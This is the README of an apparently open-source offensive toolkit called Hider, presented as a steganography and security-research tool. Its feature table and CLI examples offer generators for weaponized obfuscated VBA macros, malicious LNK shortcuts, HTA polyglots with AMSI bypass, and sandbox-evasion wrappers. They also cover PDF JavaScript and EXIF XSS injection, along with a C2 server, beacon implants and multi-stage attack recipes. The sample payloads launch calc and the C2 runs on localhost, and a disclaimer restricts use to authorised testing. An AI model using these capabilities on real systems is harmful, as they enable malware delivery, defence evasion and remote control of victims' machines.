# 🕵️ Hider — Advanced Steganography & Security Research Tool

> A powerful CLI and web-based toolkit for metadata manipulation, steganography, and payload delivery — built for penetration testers and security researchers.

---

## 🚀 Feature Overview

| Category | Technique | Description |
|---|---|---|
| **GUI Dashboard** | Flask Web UI | Modern glassmorphic interface for all operations |
| **Image** | EXIF Manipulation | View, edit, and inject payloads into JPG/TIFF metadata |
| **Image** | LSB Steganography | Hide data in least-significant bits of lossless images |
| **Audio** | WAV LSB | Hide data in the least-significant bits of `.wav` audio |
| **Archive** | ZIP Padding | Inject hidden data into ZIP tail space (file remains valid) |
| **Universal** | Tail-Loading | Append data to the end of *any* binary file |
| **Universal** | Polyglot Gen | Merge two file formats into one (e.g., JPG+ZIP) |
| **PDF** | JS Injection | Inject obfuscated JavaScript into PDF Open Actions |
| **Office** | Metadata Edit | Manipulate core properties in `.docx`, `.xlsx`, `.pptx` |
| **DLL / PE** | Resource Inject | Hide data inside Windows executable resources |
| **Video** | Metadata Edit | Manipulate tags (Artist, Comment) via FFmpeg |
| **Shortcut** | LNK Evasion | Generate malicious `.lnk` shortcuts |
| **Evasion** | HTA Polyglot | Image+HTA polyglot with AMSI bypass obfuscation |
| **Evasion** | Sandbox Detection | JScript/VBScript wrappers checking RAM, CPU, domain |
| **Evasion** | VBA Macros | Auto-generate weaponized, obfuscated VBA macros |
| **Encryption** | AES-256 | Encrypt any payload with a password before hiding |
| **C2 Server** | Flask + SQLite | Full-featured command & control listener and session tracking |
| **C2 Console** | Interactive Shell | Manage implants, queue commands, and execute modules |
| **Staging** | Automated Recipes | Generate multi-stage attack chains (AMSI patch + shellcode) |
| **Implants** | Beacon Generator | Create custom Python/PowerShell beacons with sleep & jitter |
| **Modules** | Plugin System | Hot-loadable post-exploitation modules (mem injection, persistence) |

---

## 🛠️ Installation

```bash
# Clone the repository
git clone https://github.com/Nciibi/hider.git
cd hider

# (Recommended) Set up a virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### External Dependencies
- `ffmpeg` — Required for video metadata editing: `sudo apt install ffmpeg`

---

## 🖥️ GUI Dashboard

Launch the web-based interface for a point-and-click experience and real-time **C2 Operator Console**:

```bash
python3 app.py
```

Then open your browser at: **`http://127.0.0.1:5000`**

The dashboard supports all commands below, with dynamic form controls adapting to the selected operation.

---

## 📖 CLI Reference

### Image EXIF Manipulation
```bash
# View all EXIF tags
python3 hider.py view image.jpg

# Inject XSS payload into EXIF
python3 hider.py inject image.jpg --type xss --out malicious.jpg

# Edit a specific EXIF tag
python3 hider.py edit image.jpg --key Artist --value "Attacker"
```

### Universal Steganography (any file)
```bash
# Hide data in any file (tail-loading)
python3 hider.py universal secret.pdf --mode hide --data "SECRET_DATA" --out output.pdf

# Extract previously hidden data
python3 hider.py universal output.pdf --mode extract
```

### LSB Image Steganography
```bash
# Hide data in image pixels (lossless images only: PNG, BMP)
python3 hider.py lsb image.png --mode hide --data "My Secret" --password "s3cr3t" --out stego.png

# Extract hidden data
python3 hider.py lsb stego.png --mode extract --password "s3cr3t"
```

### Audio Steganography (.WAV)
```bash
# Hide encrypted data in WAV audio
python3 hider.py audio clip.wav --mode hide --data "Audio Secret" --password "mypass" --out hidden.wav

# Extract it
python3 hider.py audio hidden.wav --mode extract --password "mypass"
```

### Archive Steganography (.ZIP)
```bash
# Inject data after the ZIP End-of-Central-Directory record
python3 hider.py archive archive.zip --mode hide --data "Hidden!" --password "zippass" --out secret.zip

# Extract
python3 hider.py archive secret.zip --mode extract --password "zippass"
```

### PDF Manipulation
```bash
# Inject obfuscated JS Open Action
python3 hider.py pdf document.pdf --mode open-action --value "app.alert('X');" --obfuscate
```

### Office Document Manipulation
```bash
# Edit core property
python3 hider.py office report.docx --mode edit --key Author --value "Attacker"
```

### HTA Polyglot (with AMSI Bypass)
```bash
# Create a file valid as both JPG and HTA, with sandbox evasion
python3 hider.py universal image.jpg --mode hta-polyglot --data "calc.exe" --obfuscate --out payload.hta
```

### Sandbox Evasion Wrappers
```bash
# Generate a JScript wrapper that checks for >= 8GB RAM, >= 4 cores, and sleeps 2s
python3 hider.py evasion --payload "powershell -c calc" --type jscript \
  --min-ram 8 --min-cores 4 --sleep 2000 --out evasion.js

# Generate a VBScript wrapper
python3 hider.py evasion --payload "cmd /c calc" --type vbscript --out evasion.vbs
```

### VBA Macro Generator
```bash
# Generate a weaponized macro that aborts if not domain-joined
python3 hider.py vba --payload "powershell -c Start-Process calc.exe" \
  --check-domain --min-ram 4 --out macro.vba
```

### Shortcut (LNK) Generation
```bash
python3 hider.py shortcut --cmd "powershell -WindowStyle Hidden -c calc" --out payload.lnk
```

### Command & Control (C2)
```bash
# Start the C2 Listener (Flask + SQLite)
python3 hider.py c2-server --port 8443

# Launch the interactive Operator Console
python3 hider.py c2-console

# Generate a beacon implant (Python or PowerShell)
python3 hider.py c2-beacon --url http://127.0.0.1:8443 --lang python --out beacon.py

# Generate a multi-stage attack recipe
python3 hider.py c2-stage --recipe windows_full --url "http://127.0.0.1:8443/beacon"
```

---

## 🗺️ Roadmap

The following features are currently in development:

- [ ] **Encrypted C2 Channels:** Implementation of mTLS, custom encryption layers, and rotating keys.
- [ ] **P2P Beacons:** SMB pivoting, named pipes, and mesh implant architectures.
- [ ] **OpSec Protections:** Traffic shaping, domain rotation, and advanced sleep masking.
- [ ] **Lateral Movement:** In-memory SMB, WMI, WinRM, and SSH pivoting modules.

---

## ⚠️ Disclaimer

This tool is provided for **educational and ethical security research purposes only**. 

Only use Hider on systems and files you own or have **explicit written permission** to test. The authors accept no responsibility for misuse or damage resulting from this tool.

**This tool is not for malicious use. Use responsibly.**

---

## 📄 License

MIT License — See `LICENSE` for details.
